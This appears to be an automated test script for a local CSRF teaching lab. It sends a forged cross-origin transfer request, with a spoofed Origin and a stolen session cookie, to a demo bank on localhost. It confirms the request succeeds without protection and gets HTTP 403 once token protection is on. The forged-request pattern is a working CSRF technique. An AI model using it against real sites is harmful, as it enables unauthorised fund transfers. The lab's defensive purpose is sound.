async function runTests() {
  console.log('🧪 Running automated verification for CSRF Variant 2...\n');

  // 1. Visit Bank to establish session
  console.log('[1] Establishing Alice session on http://localhost:3000...');
  const initRes = await fetch('http://localhost:3000/');
  const rawCookie = initRes.headers.get('set-cookie');
  const sessionCookie = rawCookie ? rawCookie.split(';')[0] : '';
  console.log(`✅ Session Cookie acquired: ${sessionCookie}`);

  // Ensure fresh state
  await fetch('http://localhost:3000/reset', { headers: { Cookie: sessionCookie } });

  // 2. Exploit in Vulnerable Mode
  console.log('\n[2] Testing CSRF attack in VULNERABLE mode...');
  const vulnAttack = await fetch('http://localhost:3000/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'http://localhost:4000',
      'Cookie': sessionCookie
    },
    body: 'recipient=Attacker_Charlie&amount=1000'
  });

  const vulnBody = await vulnAttack.text();
  if (vulnBody.includes('Transfer Completed!') && vulnBody.includes('4000.00')) {
    console.log('🎯 ATTACK SUCCEEDED: $1000 transferred to Attacker without CSRF token! Balance is now $4,000.');
  } else {
    throw new Error('Attack unexpectedly failed in vulnerable mode.');
  }

  // 3. Toggle Mitigation ON
  console.log('\n[3] Enabling CSRF Token Protection...');
  await fetch('http://localhost:3000/toggle', { headers: { Cookie: sessionCookie } });

  // 4. Repeat Exploit in Mitigated Mode
  console.log('[4] Repeating identical CSRF attack in MITIGATED mode...');
  const mitAttack = await fetch('http://localhost:3000/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'http://localhost:4000',
      'Cookie': sessionCookie
    },
    body: 'recipient=Attacker_Charlie&amount=1000'
  });

  console.log(`HTTP Status: ${mitAttack.status}`);
  const mitBody = await mitAttack.text();
  if (mitAttack.status === 403 && mitBody.includes('403 Forbidden')) {
    console.log('🛡️  ATTACK BLOCKED: Server rejected forged request with HTTP 403 Forbidden!');
  } else {
    throw new Error('Mitigation failed to block attack.');
  }

  console.log('\n======================================================');
  console.log('🏆 ALL TESTS PASSED: CSRF Variant 2 is fully working!');
  console.log('======================================================');
}

runTests().catch(err => {
  console.error(err);
  process.exit(1);
});
